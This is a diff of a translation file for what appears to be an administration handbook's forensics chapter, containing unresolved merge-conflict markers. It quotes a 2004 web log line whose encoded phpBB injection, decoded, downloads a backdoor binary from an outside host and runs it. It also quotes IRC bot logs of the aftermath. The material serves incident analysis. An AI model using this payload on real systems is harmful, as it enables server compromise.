 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 msgstr ""
@@ -2260,8 +2487,12 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
+=======
+msgid "** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
 "** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024\n"
 "** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating\n"
@@ -2274,6 +2505,10 @@ msgid ""
 "** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)\n"
 "(...)\n"
 "** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -2290,3 +2525,7 @@ msgstr ""
 #, no-c-format
 msgid "In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability."
 msgstr ""
+<<<<<<< HEAD
+=======
+
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
